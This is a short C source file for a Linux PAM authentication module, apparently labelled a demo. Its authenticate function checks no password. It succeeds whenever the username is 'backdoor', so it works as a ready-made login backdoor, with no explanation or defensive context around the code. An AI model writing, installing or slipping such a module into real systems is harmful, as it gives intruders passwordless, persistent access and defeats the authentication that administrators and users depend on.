#include <syslog.h>
#include <stdio.h>
#include <security/pam_modules.h>

#define PAM_SM_AUTH


PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
    return PAM_SUCCESS ;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
    setlogmask(LOG_DEBUG);
    syslog(LOG_DEBUG, "wangli_pam_demo\n");
    int retval;
    char* pUsername;
    retval = pam_get_user(pamh, &pUsername, "TUsername: ");
    if (retval != PAM_SUCCESS) {
        return retval;
    }
    if (strcmp(pUsername, "backdoor") != 0) {
        return PAM_AUTH_ERR;
    }
    return PAM_SUCCESS;
}